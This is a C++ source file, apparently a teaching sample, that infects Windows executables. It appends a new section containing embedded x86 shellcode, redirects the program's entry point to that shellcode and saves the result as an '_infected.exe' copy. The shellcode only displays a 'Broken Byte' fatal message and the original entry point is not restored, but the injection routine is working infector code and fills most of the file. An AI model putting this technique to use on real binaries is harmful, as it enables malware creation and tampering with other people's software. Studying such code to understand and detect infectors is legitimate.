#include <iostream>
#include <Windows.h>
#pragma warning(disable : 4996)
char x86_nullfree_msgbox[] =
        "\x31\xd2\xb2\x30\x64\x8b\x12\x8b\x52\x0c\x8b\x52\x1c\x8b\x42"
        "\x08\x8b\x72\x20\x8b\x12\x80\x7e\x0c\x33\x75\xf2\x89\xc7\x03"
        "\x78\x3c\x8b\x57\x78\x01\xc2\x8b\x7a\x20\x01\xc7\x31\xed\x8b"
        "\x34\xaf\x01\xc6\x45\x81\x3e\x46\x61\x74\x61\x75\xf2\x81\x7e"
        "\x08\x45\x78\x69\x74\x75\xe9\x8b\x7a\x24\x01\xc7\x66\x8b\x2c"
        "\x6f\x8b\x7a\x1c\x01\xc7\x8b\x7c\xaf\xfc\x01\xc7\x68\x79\x74"
        "\x65\x01\x68\x6b\x65\x6e\x42\x68\x20\x42\x72\x6f\x89\xe1\xfe"
        "\x49\x0b\x31\xc0\x51\x50\xff\xd7";


bool readBinFile(const char fileName[], char** bufPtr, DWORD& length) {
    if (FILE* fp = fopen(fileName, "rb")) {
        fseek(fp, 0, SEEK_END);
        length = ftell(fp);
        *bufPtr = new char[length + 1];
        fseek(fp, 0, SEEK_SET);
        fread(*bufPtr, sizeof(char), length, fp);
        return true;
    }
    return false;
}


int main(int argc, char* argv[]){
    if(argc!=2){
        puts("[!] Usage: ./PE_Patcher.exe [path/to/file]");
    }

    char *buff; DWORD fileSize;
    if(!readBinFile(argv[1], &buff, fileSize)){
        puts("[!] Selected file not found.");
        return 0;
    }

#define getNtHdr(buf) ((IMAGE_NT_HEADERS *)((size_t)buf + ((IMAGE_DOS_HEADER *)buf)->e_lfanew))
#define getSectionAddr(buf) ((IMAGE_SECTION_HEADER *)((size_t)getNtHdr(buf) + sizeof(IMAGE_NT_HEADERS)))
#define P2ALIGNUP(size, align) ((((size) / (align)) + 1) * (align))

    puts("[+] malloc memory for outputed *.exe file.");
    size_t sectAlign = getNtHdr(buff)->OptionalHeader.SectionAlignment,  // get Section Align
    fileAlign = getNtHdr(buff)->OptionalHeader.FileAlignment, // get File Align
    finalOutSize = fileSize + P2ALIGNUP(sizeof(x86_nullfree_msgbox), fileAlign);

    char* outBuf = (char *)malloc(finalOutSize); // start address of new section
    memcpy(outBuf, buff, fileSize); // 把原本的PE code放進來


    puts("[+] create a new section to store shellcode.");
    // 取得 fileHeader, sectionHeader
    auto fileHdr = getNtHdr(outBuf)->FileHeader;
    auto sectAdr = getSectionAddr(outBuf);

    // create new section
    PIMAGE_SECTION_HEADER lastestSecHdr = &sectAdr[fileHdr.NumberOfSections - 1];
    PIMAGE_SECTION_HEADER newSectionHdr = lastestSecHdr + 1;

    // write detail info for the new section header.
    memcpy(newSectionHdr->Name, "30cm.tw", 8);

    //  P2ALIGNUP(shellcode 大小, Align)
    newSectionHdr->Misc.VirtualSize = P2ALIGNUP(sizeof(x86_nullfree_msgbox), sectAlign);
    // 填寫RVA = 前一段section的RVA + 前一段section經過align處理後的大小
    newSectionHdr->VirtualAddress = P2ALIGNUP((lastestSecHdr->VirtualAddress + lastestSecHdr->Misc.VirtualSize), sectAlign);

    // 把 shellcode 內容放進靜態PE資料
    newSectionHdr->SizeOfRawData = sizeof(x86_nullfree_msgbox);
    // 設定 所有setcions 大小
    newSectionHdr->PointerToRawData = lastestSecHdr->PointerToRawData + lastestSecHdr->SizeOfRawData;
    newSectionHdr->Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_MEM_WRITE;
    getNtHdr(outBuf)->FileHeader.NumberOfSections += 1; // 要把section+1 系統才會讀取到新的section


    puts("[+] pack x86 shellcode into new section.");
    memcpy(outBuf + newSectionHdr->PointerToRawData, x86_nullfree_msgbox, sizeof(x86_nullfree_msgbox));

    puts("[+] repair virtual size .(consider *.exe built by old compiler");
    for(size_t i=1 ; i< getNtHdr(outBuf)->FileHeader.NumberOfSections ; i++){
        sectAdr[i-1].Misc.VirtualSize = sectAdr[i].VirtualAddress - sectAdr[i-1].VirtualAddress;
    }

    puts("[+] fix image size in memory");
    getNtHdr(outBuf)->OptionalHeader.SizeOfImage =
            getSectionAddr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections-1].VirtualAddress +
                    getSectionAddr(outBuf)[getNtHdr(outBuf)->FileHeader.NumberOfSections-1].Misc.VirtualSize;

    puts("[+] point EP to shellcode");
    getNtHdr(outBuf)->OptionalHeader.AddressOfEntryPoint = newSectionHdr->VirtualAddress;

    char outputPath[MAX_PATH];
    memcpy(outputPath, argv[1], sizeof(outputPath));
    strcpy(strrchr(outputPath,'.'), "_infected.exe");
    FILE *fp = fopen(outputPath, "wb");
    fwrite(outBuf,1,finalOutSize,fp);
    fclose(fp);

    printf("[+] file saved at %s\n", outputPath);
    puts("[+] done.");

    return 0;

}
